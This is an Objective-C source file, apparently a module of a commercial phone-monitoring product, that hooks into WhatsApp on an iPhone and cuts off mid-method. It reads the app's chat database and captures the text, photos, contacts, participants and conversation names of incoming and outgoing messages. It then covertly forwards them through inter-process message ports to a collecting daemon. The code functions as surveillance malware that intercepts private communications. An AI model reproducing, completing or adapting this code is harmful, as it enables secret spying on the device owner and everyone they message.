/**
 - Project name :  MSFSP
 - Class name   :  WhatsAppUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

// WhatsApp Utils
#import "WhatsAppUtils.h"
#import "WhatsAppMessageStore.h"
#import "WhatsAppMediaUtils.h"
#import "WhatsAppMediaObject.h"

// Other Utils
#import "FMDatabase.h"
#import "DefStd.h"
#import "DateTimeFormat.h"
#import "MessagePortIPCSender.h"
#import "DaemonPrivateHome.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "ABContactsManager.h"

// WhatsApp header files
#import "XMPPMessageStanza.h"
//#import "WAMessage.h"


#pragma mark -
#pragma mark Constant Declaration

static NSString* const kConverstaionIdKey					= @"ConverstaionIdKey";
static NSString* const kConverstaionNameKey					= @"ConverstaionNameKey";

// -- finding group number
static NSString* const kSelectWhatsAppGroupInfo				= @"Select ZGROUPINFO from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";
static NSString* const kSelectWhatsAppGroupInfoWithJID		= @"Select ZGROUPINFO from ZWACHATSESSION where ZCONTACTJID='%@'";
//static NSString* const kSelectWhatsAppGroupName			= @"Select ZTEXT from ZWAMESSAGE where ZCHATSESSION in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@') AND ZGROUPEVENTTYPE = 1";
//static NSString* const kSelectWhatsAppGroupName2			= @"Select ZPARTNERNAME from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";
static NSString* const kSelectWhatsAppGroupNameID			= @"Select ZPARTNERNAME, ZCONTACTJID from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";

// -- query participant
static NSString* const kSelectWhatsAppGroupMember			= @"Select ZCONTACTNAME, ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION in (SELECT Z_PK from ZWACHATSESSION where ZCONTACTJID='%@') AND ZISACTIVE = 1";
static NSString* const kSelectWhatsAppGroupChat				= @"Select ZCONTACTNAME, ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@') AND ZISACTIVE = 1";
static NSString* const kSelectWhatsAppSingleChat			= @"Select ZPARTNERNAME,ZCONTACTJID from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";

// -- query incoming photo
static NSString* const kSelectWhatsAppIncomingPhotoPath		= @"Select ZMEDIALOCALPATH from ZWAMEDIAITEM where Z_PK in (SELECT ZMEDIAITEM from ZWAMESSAGE where ZSTANZAID='%@')";

// -- WhatsApp content type
static NSString * const kWhatsAppContentTypeImage			= @"image";
static NSString * const kWhatsAppContentTypeAudio			= @"audio";
static NSString * const kWhatsAppContentTypeVideo			= @"video";
static NSString * const kWhatsAppContentTypeLocation		= @"location";
static NSString * const kWhatsAppContentTypeContact			= @"vcard";



@interface WhatsAppUtils (private)

- (NSString *)	searchWhatsAppPath;
- (NSDictionary *) findConversationNameId: (NSString *) aMessageId;
- (NSArray *)	selectParticipantsWithMsgID:(NSString *) messageID 
				messageSenderToBeFiltered:(NSString *) aSender
								  fromJID:(NSString *) aFromJID;
- (NSUInteger)	groupNumberFromJID:(NSString *) aFromJID;
- (NSInteger)	groupNumberFromMessage:(NSString *) messageID;
- (NSString *)	formatWhatsAppID:(NSString*)wID;

// Incoming
- (NSData *)	getIncomingImageForMessageID: (NSString *) aMessageID;

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
+ (void) sendWhatsAppEvent: (FxIMEvent *) aIMEvent;

+ (void) sendAnyContentTypeEventUserID: (NSString *) aUserID						// user id
					   userDisplayName: (NSString *) aUserDisplayName				// user display name
					 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
				userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture
						  userLocation: (FxIMGeoTag *) aUserLocation

				 messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
							   message: (NSString *) aMessage
							 direction: (FxEventDirection) aDirection				// direction

						conversationID: (NSString *) aConversationID				// conversation id
					  conversationName: (NSString *) aConversationName				// conversation name
			conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

						  participants: (NSArray *) aParticipants														

						   attachments: (NSArray *) aAttachments

						 shareLocation: (FxIMGeoTag *) aSharedLocation;

+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants			 

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData;

+ (void) sendVideoContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   videoPath: (NSURL *) aVideoPath
						   thumbnailData: (NSData *) aThumbnailData;

// Photo Attachment Utils
+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData;

// Video Attachment Utils
+ (FxAttachment *) createVideoAttachmentForData: (NSData *) aData 
								  thumbnailData: (NSData *) aThumbnailData
								  fileExtension: (NSString *) aExtension;

// General Attachment Utils
+ (NSString *) createTimeStamp;
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension;
+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

@end


@implementation WhatsAppUtils

@synthesize mAccountInfo;

/**
 - Method name: init
 - Purpose:This method is used to initalize WhatsAppUtils
 - Argument list and description: No Argument
 - Return description: No return type
 */
- (id) init {
	if ((self = [super init])) {
		NSString *whatsAppApth = [self searchWhatsAppPath];
		if(whatsAppApth) {
			mWhatsAppDB = [FMDatabase databaseWithPath:whatsAppApth];
			[mWhatsAppDB retain];
			[mWhatsAppDB open];
		}
		else {
			DLog (@"WhatsApp DB Error");
		}
		
	}
	return (self);
}


#pragma mark -
#pragma mark Private Method


/**
 - Method name: searchWhatsAppPath:
 - Purpose:  This method is used to search WahtsApp DB path
 - Argument list and description:No Argument
 - Return type and description: No Return type 
 */

- (NSString *) searchWhatsAppPath {
	NSString *whatsAppPath = nil;
	
	// Method 1
	/*NSError *error = nil;
	 NSArray *subFolderList = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile/Applications" error:&error];
	 if (!error) {
		for (NSString *subFolder in subFolderList) {
		BOOL isDirectory = FALSE;																					
		whatsAppPath = [NSString stringWithFormat:@"/var/mobile/Applications/%@", subFolder];
		DLog(@"whatsAppPath %@", subFolder)
		[[NSFileManager defaultManager] fileExistsAtPath:whatsAppPath isDirectory:&isDirectory];						
			if (isDirectory) {
			NSArray *appList = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:whatsAppPath error:&error];
			DLog(@"Apps:%@", appList);
			NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",@"WhatsApp.app"];
			NSArray *result = [appList filteredArrayUsingPredicate:predicate];
			DLog(@"result %@", result)
			if ([result count]) {
				DLog(@"<<<<<< break >>>>>>")
				whatsAppPath = [NSString stringWithFormat:@"%@/Documents/ChatStorage.sqlite", whatsAppPath];
				DLog(@"WhatsAppPath:%@", whatsAppPath);
				break;
				}
			} 
		}
	 }*/
	
	// Method 2
	NSArray *paths = NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES);
	if([paths count]) {
		NSString *docDirPath = [paths objectAtIndex:0];
		whatsAppPath = [NSString stringWithFormat:@"%@/ChatStorage.sqlite", docDirPath];
		//DLog (@"WHATSAPP DB PATH:%@", whatsAppPath);
	}
	return (whatsAppPath);
}


- (NSDictionary *) findConversationNameId: (NSString *) aMessageId {
	NSString *conversationName = @"";
	NSString *conversationId   = @"";
	
	// -- find conversation id and name
	NSString *groupNameIdSql = [NSString stringWithFormat:kSelectWhatsAppGroupNameID, aMessageId];		
	DLog (@"groupNameIdSql %@", groupNameIdSql)
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:groupNameIdSql];
	while ([resultSet next]) {
		conversationName = [resultSet stringForColumn:@"ZPARTNERNAME"];
		conversationId = [resultSet stringForColumn:@"ZCONTACTJID"];				
		DLog (@"conversationName %@", conversationName)
		DLog (@"conversationId %@", conversationId)
	}
	
	return [NSDictionary dictionaryWithObjectsAndKeys:conversationName, kConverstaionNameKey,
			conversationId, kConverstaionIdKey, nil];	
}

/**
 - Method name: selectParticipants
 - Purpose:This method is used to select Participants
 - Argument list and description: No Argument
 - Return description: requestArray(NSArray)
 */

- (NSArray *) selectParticipantsWithMsgID:(NSString *) messageID 
				messageSenderToBeFiltered:(NSString *) aSender 
								  fromJID:(NSString *) aFromJID {
						
	
	NSMutableArray* resultArray = [[NSMutableArray alloc] init];
	NSString *sql				= nil;	
	
	// -- find group info using contact JID
	NSInteger groupNumber = 0;
	if (aFromJID) {														// incoming case
		groupNumber		= [self groupNumberFromJID:aFromJID];
		DLog(@"> group number (JID) %d", groupNumber);
		if (groupNumber != 0)
			sql = [NSString stringWithFormat:kSelectWhatsAppGroupMember, aFromJID];	
	} else {															// outgoing case
		groupNumber		= [self groupNumberFromMessage:messageID];
		DLog(@"> group number (w/o JID) %d", groupNumber);
		if (groupNumber != 0)
			sql = [NSString stringWithFormat:kSelectWhatsAppGroupChat, messageID];
	}
	
	// -- Group number exists
	if (groupNumber != 0) {			
		DLog (@"> Group number exists %d", groupNumber)		
		//sql = [NSString stringWithFormat:kSelectWhatsAppGroupChat, messageID];
		//sql = [NSString stringWithFormat:kSelectWhatsAppGroupMember, aFromJID];	
		
		
		// -- find group name	
		/* Not use group id as conversation id because individual coversation does not has group id
		NSString *groupNameSql = [NSString stringWithFormat:kSelectWhatsAppGroupName2, messageID];		
		DLog (@"groupNameSql %@", groupNameSql)
		FMResultSet* resultSet = [mWhatsAppDB executeQuery:groupNameSql];
		while ([resultSet next]) {
			groupName = [resultSet stringForColumnIndex:0];
			DLog (@"group name %@", groupName)
		}
		 */
	}
	// -- Group number does not exist
	else {
		DLog (@"> Group number does not exist in the first finding.... delete or single chat")
		sql = [NSString stringWithFormat:kSelectWhatsAppSingleChat, messageID];								
		// In case of incoming and Single conversation, the target device is not included in the result
		// In case of incoming and Group conversation, the target device is included in the query result			
	}
	
	//DLog(@"> SQL: %@",sql);	
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:sql];	
	
	int i = 1;
	while ([resultSet next]) {
		NSString *contactNumber = [self formatWhatsAppID:[resultSet stringForColumnIndex:1]];
		NSString *contactName = [resultSet stringForColumnIndex:0];
		
		DLog (@"contact number: %@", contactNumber)
		DLog (@"contact name %d: %@", i, contactName)

		if (contactNumber) {	
			// -- Ensure that participants does NOT include the sender of the message
			if (![contactNumber isEqualToString:aSender]) {													// not sender
				NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
				
				[dictionary setValue:contactNumber forKey:kWhatsAppContactNumber];				
				[dictionary setValue:contactName forKey:kWhatsAppContactName];
				
				DLog (@"assigned contact name %@", [mAccountInfo objectForKey:kWhatsAppContactName])
				
				//DLog (@"resultArray before %@", resultArray)
				// -- assign contact name for the target account if it is not exist
				if ([contactNumber isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
					if ([mAccountInfo objectForKey:kWhatsAppContactName] != nil		&&
						[mAccountInfo objectForKey:kWhatsAppContactName] != @"") {						
						//if ([contactName isEqualToString:@""] || contactName == nil ) {													
							[dictionary setValue:[mAccountInfo objectForKey:kWhatsAppContactName]
										  forKey:kWhatsAppContactName];
						//}	
					}
					DLog (@"insert at index 0")					
					[resultArray insertObject:dictionary atIndex:0];				// The target must be in the 1st index of array for incoming
				} else {
					[resultArray addObject:dictionary];
				}
					
				//DLog (@"resultArray after %@", resultArray)
				
				[dictionary release];
				dictionary = nil;
			}
		}
		i++;
	}
	DLog(@"> Participants Array:%@", resultArray);
	return [resultArray autorelease];
}

/**
 - Method name:				groupNumberFromMessage:
 - Purpose:  This method is used to identify chat group if gno=0 no group chat
 - Argument list and description: messageID (NSString)
 - Return type and description:gno(NSUInteger)  
 */
- (NSInteger) groupNumberFromMessage:(NSString *) messageID {
	NSUInteger gno = 0;
	//DLog (@"sql to get group number %@", [NSString stringWithFormat:kSelectWhatsAppGroupInfo, messageID])
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:[NSString stringWithFormat:kSelectWhatsAppGroupInfo,messageID]];
	while ([resultSet next]) {
	    gno = [resultSet intForColumnIndex:0];
	}
	return gno;
}

- (NSUInteger) groupNumberFromJID:(NSString *) aFromJID {
	NSUInteger gno = 0;
	//DLog (@"sql to get group number %@", [NSString stringWithFormat:kSelectWhatsAppGroupInfoWithJID, aFromJID])
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:[NSString stringWithFormat:kSelectWhatsAppGroupInfoWithJID,aFromJID]];
	while ([resultSet next]) {
		//DLog (@"[resultSet intForColumnIndex:0] %d", [resultSet intForColumnIndex:0])
	    gno = [resultSet intForColumnIndex:0];
	}
	return gno;
}

/**
 - Method name: formatWhatsAppID:
 - Purpose:  This method is used to format WhatsApp Id
 - Argument list and description: wID (NSString)
 - Return type and description:whatsAppID(NSString)  
 */
- (NSString *) formatWhatsAppID: (NSString *) wID {
	NSString *whatsAppID = @"";
	NSArray *numberArr = [wID componentsSeparatedByString:@"@"];
	if([numberArr count]) {
		whatsAppID = [numberArr objectAtIndex:0];
	}
	return whatsAppID;
}


#pragma mark Public Methods


/**
 - Method name: incomingMessageParts:
 - Purpose:  This method is used to  create Incoming incomingMessageParts
 - Argument list and description: aArg (id)
 - Return type and description: (id)  
 */
- (id) incomingMessageParts: (id) aArg {
	id incomingParts = nil;
	if([aArg isKindOfClass:[NSArray class]]){
		for (id element in aArg) {
			if ([element isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
				incomingParts = element;
				break;
			}
		}
	}
	return incomingParts;
}

/**
 - Method name: accountInfo:userName:
 - Purpose:  This method is used to create WhatsApp account info
 - Argument list and description: aUserID (NSString *),userName(NSString *)
 - Return type and description: No Return 
 */
- (NSDictionary *) accountInfo: (NSString *) aUserID
					  userName: (NSString *) aUserName {
	
	NSMutableDictionary *accountDict = [[NSMutableDictionary alloc] init];
	[accountDict setObject:aUserID forKey:kWhatsAppContactNumber];
	[accountDict setObject:aUserName forKey:kWhatsAppContactName];
	return [accountDict autorelease];
}


#pragma mark Incoming Public Method

/**
 - Method name: createIncomingWhatsAppEvent:
 - Purpose:  This method is used to  create Incoming whatsapp event
 - Argument list and description: aIncomingEvent (id)
 - Return type and description: No Return 
 */

- (void) createIncomingWhatsAppEvent:(id) aIncomingEvent  {
	DLog (@"Our Thread: %@", [NSThread currentThread])
	
	DLog (@"Incoming message: %@",(NSString *)[aIncomingEvent text])
	
	DLog(@"Capturing XMPPStream =====>sending....");		
	DLog(@"media %@",				[aIncomingEvent media])
	DLog(@"locationName %@",		[aIncomingEvent locationName])
	DLog(@"locationLongitude %@",	[aIncomingEvent locationLongitude])
	DLog(@"locationLatitude %@",	[aIncomingEvent locationLatitude])
	DLog(@"vCardContactName %@",	[aIncomingEvent vCardContactName])
	DLog(@"vCardStringValue %@",	[aIncomingEvent vCardStringValue])
	DLog(@"thumbnailData %@",		[aIncomingEvent thumbnailData])
	DLog(@"mediaDuration %d",		[aIncomingEvent mediaDuration])
	DLog(@"mediaName %@",			[aIncomingEvent mediaName])
	DLog(@"mediaURL %@",			[aIncomingEvent mediaURL])
	DLog(@"hasMedia %d",			[aIncomingEvent hasMedia])
	DLog(@"hasBody %d",				[aIncomingEvent hasBody])
	DLog(@"mediaType %d",			[aIncomingEvent mediaType])
	DLog(@"media %@",				[aIncomingEvent media])
	DLog(@"value %@",				[[aIncomingEvent media] value])	
	DLog(@"name %@",				[[aIncomingEvent media] name])	
	DLog(@"attributes %@",			[[aIncomingEvent media] attributes])	
	DLog(@"body %@",				[aIncomingEvent body])	
	DLog(@"vcard %@",				[aIncomingEvent vcard])	
	
	WhatsAppMessageStore *waMsgStore = [WhatsAppMessageStore shareWhatsAppMessageStore];
	
	if (![waMsgStore isIncomingMessageDuplicate:[[aIncomingEvent attributes] objectForKey:@"id"]]) {
		DLog (@"Not duplicate")
		
		if(aIncomingEvent) {
			aIncomingEvent				= (XMPPMessageStanza *)aIncomingEvent;
			NSString *message			= (NSString *)[aIncomingEvent text];
			
			// -- get media type string
			int mediaType				= [aIncomingEvent mediaType];
			NSString *mediaTypeString	= [aIncomingEvent stringForMediaType:mediaType];
			DLog (@"media type string %@", mediaTypeString)
			
			if (message															|| 
				[mediaTypeString isEqualToString:kWhatsAppContentTypeImage]		){
				
				NSString *msgId			= [[aIncomingEvent attributes] objectForKey:@"id"];
				DLog (@"incoming msgId %@", msgId)
				NSString *whatsAppID	= [aIncomingEvent author];
				if(![aIncomingEvent author]) 
					whatsAppID = [aIncomingEvent fromJID];
				DLog (@">>> whatsAppID %@", whatsAppID)
				NSString *userId		= [self formatWhatsAppID:whatsAppID];
				DLog (@">>> userId %@", userId)
				ABContactsManager *abManager = [[ABContactsManager alloc] init];
				//NSString *userName		= [abManager searchContactName:userId];
				NSString *userName		= [abManager searchPrefixFirstMidLastSuffix:userId];
				
				DLog (@">>> userName: %@", userName)
				[abManager release];
				
				//NSArray *participantsInfo = [self selectParticipants:msgId];
				NSMutableArray *participantsInfo = [NSMutableArray arrayWithArray:[self selectParticipantsWithMsgID:msgId 
																						  messageSenderToBeFiltered:userId
																											fromJID:[aIncomingEvent fromJID]]];																							
											
				BOOL isRequiredToIncludeTarget = YES;
				for (NSDictionary *participant in participantsInfo) {
					if ([[participant valueForKey:kWhatsAppContactNumber] isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
						isRequiredToIncludeTarget = NO;
						//DLog (@"> no need to include target")
						break;					
					}					
				}
				if (isRequiredToIncludeTarget) 
					[participantsInfo addObject:mAccountInfo]; // required for sinble conversation

				NSMutableArray *participants = [NSMutableArray array];
				for (NSDictionary *partInfo in participantsInfo) {
					FxRecipient *participant = [[FxRecipient alloc] init];
					[participant setRecipNumAddr:[partInfo objectForKey:kWhatsAppContactNumber]];
					[participant setRecipContactName:[partInfo objectForKey:kWhatsAppContactName]];
					[participants addObject:participant];
					[participant release];
				}
				
				
				NSDictionary *conversationInfo	= [[NSDictionary alloc] initWithDictionary:[self findConversationNameId:msgId]];
				NSString *conversationName		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionNameKey]];			
				NSString *conversationId		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionIdKey]];
				[conversationInfo release];
				conversationInfo = nil;
								
				// -- Image
				if ([mediaTypeString isEqualToString:kWhatsAppContentTypeImage]){															
					// -- get image
					NSData *imageData = [self getIncomingImageForMessageID:msgId];					
					//DLog (@">>>> in image data %@", imageData)																			
				
					[WhatsAppUtils sendImageContentTypeEventUserID:userId
												   userDisplayName:userName
												 userStatusMessage:@""
											userProfilePictureData:nil
														 direction:kEventDirectionIn
													conversationID:conversationId
												  conversationName:conversationName
										conversationProfilePicture:nil
													  participants:participants
														 photoData:imageData
													 thumbnailData:(NSData *)[(XMPPMessageStanza *)aIncomingEvent thumbnailData]];															
				}
				// -- Text
				else {					
					// -- send FXIMEvent for text ----------------------------------------------------------------------				
					DLog (@"Text")					
					[WhatsAppUtils sendAnyContentTypeEventUserID:userId
												 userDisplayName:userName
											   userStatusMessage:@""
										  userProfilePictureData:nil
													userLocation:nil
										   messageRepresentation:kIMMessageText
														 message:message
													   direction:kEventDirectionIn
												  conversationID:conversationId
												conversationName:conversationName
									  conversationProfilePicture:nil
													participants:participants
													 attachments:[NSArray array]
												   shareLocation:nil];
																		
													
				}
				
				[conversationId release];
				conversationId = nil;
				[conversationName release];
				conversationName = nil;			
				
				DLog(@"XMPPMessageStanza ==========> User Name: %@", userName);
				DLog(@"XMPPMessageStanza ==========> User ID: %@",userId);
				DLog(@"XMPPMessageStanza ==========> Message: %@",message);
				//DLog(@"XMPPMessageStanza ==========> FxRecipients: %@",participants);
				DLog(@"XMPPMessageStanza ==========> Attributes: %@",[aIncomingEvent attributes]);
				
				DLog (@"*******************************************************************************************")
				DLog ("*******************	    INCOMING WHATSAPP EVENT      *******************");
				DLog (@"*******************************************************************************************")
			}
		}
	} else {
		DLog (@"Duplicate WhatsApp Incoming Message")
	}
}


#pragma mark Incoming


- (NSData *) getIncomingImageForMessageID: (NSString *) aMessageID {
	DLog (@"getIncomingImageForMessageID %@", aMessageID)
	
	NSString *sql			= [NSString stringWithFormat:kSelectWhatsAppIncomingPhotoPath, aMessageID];			
	//DLog (@"sql statement for incoming image %@", sql)
	FMResultSet* resultSet	= [mWhatsAppDB executeQuery:sql];
	NSString *imagePath		= nil;
	
	while ([resultSet next]) {
		DLog (@"There is a result %@", [resultSet resultDict])
		imagePath = [resultSet stringForColumnIndex:0];
		DLog (@">>>>imagePath  %@", imagePath)
		if (imagePath) {
			NSArray *libPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);	// --> APP/Library/
			DLog (@">>>> libPaths %@", libPaths)
			if ([libPaths objectAtIndex:0]) {
				imagePath = [[libPaths objectAtIndex:0] stringByAppendingPathComponent:imagePath];
				DLog (@"image path %@", imagePath)
			}			
		}
	}
	
	NSData *imageData = nil;
	
	// -- get image data
	if (imagePath) {
		UIImage *image	= [[UIImage alloc] initWithContentsOfFile:imagePath];		
		imageData		= UIImageJPEGRepresentation(image, 0);		
		[image release];
		image			= nil;
	}
	
	if (!imageData) {
		DLog (@"===================================")
		DLog (@"INCOMING IMAGE does not EXIST yet")
		DLog (@"===================================")
	}
	return imageData;
}


#pragma mark Outgoing Public Method


/**
 - Method name:						createOutgoinWhatsAppEvent:
 - Purpose:							This method is used to  create outgoing whatsapp event
 - Argument list and description:	aOutGoingEvent (id)
 - Return type and description:		No Return 
 */
- (void) createOutgoingWhatsAppEvent: (id) aOutGoingEvent {
	DLog (@"Outgoing message: %@",(NSString *)[aOutGoingEvent text])
	DLog (@"attributes %@", aOutGoingEvent)
	WhatsAppMessageStore *waMsgStore = [WhatsAppMessageStore shareWhatsAppMessageStore];
	if (![waMsgStore isOutgoingMessageDuplicate:[[aOutGoingEvent attributes] objectForKey:@"id"]]) {
			
		NSString *message = (NSString *)[aOutGoingEvent text];
		DLog (@"++++++++++ message +++++++++: %@ ", message)
		// -- get media type string
		int mediaType				= [aOutGoingEvent mediaType];
		NSString *mediaTypeString	= [aOutGoingEvent stringForMediaType:mediaType];
		DLog (@"media type string %@", mediaTypeString)
		
		if (message														|| 
			[mediaTypeString isEqualToString:kWhatsAppContentTypeImage]	){
			//[mediaTypeString isEqualToString:kWhatsAppContentTypeVideo]	){
			
			DLog(@"XMPPStream =====> Message available....");
			
			NSString *msgId				= [[aOutGoingEvent attributes] objectForKey:@"id"];  
			DLog (@"> msgId %@", msgId)
			
			// This 'participantsInfo' does not include the target device's account because it is filter inside this method
			//NSArray *participantsInfo	= [self selectParticipants:msgId];
			NSArray *participantsInfo	= [self selectParticipantsWithMsgID:msgId
													messageSenderToBeFiltered:[mAccountInfo objectForKey:kWhatsAppContactNumber]
																	fromJID:nil];														
			DLog (@"participantsInfo %@", participantsInfo)
	
			NSDictionary *conversationInfo	= [[NSDictionary alloc] initWithDictionary:[self findConversationNameId:msgId]];
			NSString *conversationName		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionNameKey]];			
			NSString *conversationId		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionIdKey]];
			[conversationInfo release];
			conversationInfo = nil;
												
			/// !!! when changing WhatsApp status , the count of participant is 0
			if ([participantsInfo count] != 0) {	
				NSMutableArray *participants = [NSMutableArray array];
				for (NSDictionary *partInfo in participantsInfo) {
					FxRecipient *participant = [[FxRecipient alloc] init];
					[participant setRecipNumAddr:[partInfo objectForKey:kWhatsAppContactNumber]];
					[participant setRecipContactName:[partInfo objectForKey:kWhatsAppContactName]];
					[participants addObject:participant];
					[participant release];
				}				
								
				// -- Image
				if ([mediaTypeString isEqualToString:kWhatsAppContentTypeImage]){		
					DLog (@">>> WhatsApp outgoing image")
					WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
					DLog (@"mediaObj %@", mediaObj)
					[WhatsAppUtils sendImageContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
												   userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
												 userStatusMessage:@""
											userProfilePictureData:nil
														 direction:kEventDirectionOut
													conversationID:conversationId
												  conversationName:conversationName
										conversationProfilePicture:nil
													  participants:participants
														 photoData:UIImageJPEGRepresentation([mediaObj mImage], 0)			// 0 most
													 thumbnailData:(NSData *)[(XMPPMessageStanza *)aOutGoingEvent thumbnailData]];
				} 				
				// -- Video
//				else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeVideo]){
//					DLog (@">>> WhatsApp outgoing video")
//					WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
//					DLog (@"mediaObj %@", mediaObj)
//					[WhatsAppUtils sendVideoContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber] 
//												   userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
//												 userStatusMessage:@""
//											userProfilePictureData:nil
//														 direction:kEventDirectionOut
//													conversationID:conversationId
//												  conversationName:conversationName
//										conversationProfilePicture:nil
//													  participants:participants
//														 videoPath:[mediaObj mVideoUrl]
//													 thumbnailData:(NSData *)[(XMPPMessageStanza *)aOutGoingEvent thumbnailData]];
//					
//				}
				// -- Text
				else {
					// -- send FXIMEvent for text ----------------------------------------------------------------------				
					DLog (@">>> WhatsApp outgoing text")
					[WhatsAppUtils sendAnyContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
												 userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
											   userStatusMessage:@""
										  userProfilePictureData:nil
													userLocation:nil
										   messageRepresentation:kIMMessageText
														 message:message
													   direction:kEventDirectionOut
												  conversationID:conversationId
												conversationName:conversationName
									  conversationProfilePicture:nil
													participants:participants
													 attachments:[NSArray array]
												   shareLocation:nil];
				}
				[conversationId release];
				conversationId = nil;
				[conversationName release];
				conversationName = nil;
		
				
				// -- END sending WhatsApp event ---------------------------------------------------------------				
				DLog(@"XMPPMessageStanza==========> User Name: %@",[mAccountInfo objectForKey:kWhatsAppContactName]);
				DLog(@"XMPPMessageStanza==========> User ID: %@",[mAccountInfo objectForKey:kWhatsAppContactNumber]);
				DLog(@"XMPPMessageStanza==========> Message: %@",message);
				DLog(@"XMPPMessageStanza==========> FXParticipants: %@",participants);
				
				DLog (@"*******************************************************************************************")
				DLog ("*******************	    OUTGOING WHATSAPP EVENT      *******************");
				DLog (@"*******************************************************************************************")
			}
		}
	} else {
		DLog (@"Duplicate outgoing whatsapp message")
	}
}


#pragma mark Event Sending Utils

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	successfully = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	messagePortSender = nil;
	return (successfully);
}

+ (void) sendWhatsAppEvent: (FxIMEvent *) aIMEvent {
	// -- construct the data
	NSMutableData* data			= [[NSMutableData alloc] init];
	NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:aIMEvent forKey:kiMessageArchived];
	[archiver finishEncoding];
	[archiver release];	
	
	//MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kWhatsAppMessagePort1];				
	BOOL successfully = NO;

	// -- load balance
	if (!(successfully = [WhatsAppUtils sendDataToPort:data portName:kWhatsAppMessagePort1])) {		// send to port 1		
		DLog (@"First sending WhatsApp fail");
		successfully = [WhatsAppUtils sendDataToPort:data portName:kWhatsAppMessagePort2];			// send to port 2
		
		if (!successfully) {
			DLog (@"Second sending WhatsApp also fail");
			[self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
		}		
	} 
		
// !!!: Testing purpose (LOGGING)
//	if ([aIMEvent mAttachments]					&& 
//		[[aIMEvent mAttachments] count] != 0	){		
//		DLog (@"result %d %@", successfully, [(FxAttachment *)[[aIMEvent mAttachments] objectAtIndex:0] fullPath])
//	} else {
//		DLog (@"result (no attachment) %d %@", successfully, [aIMEvent mMessage])
//	}
			
	[data release];
	data = nil;
}

+ (void) sendAnyContentTypeEventUserID: (NSString *) aUserID						// user id
					   userDisplayName: (NSString *) aUserDisplayName				// user display name
					 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
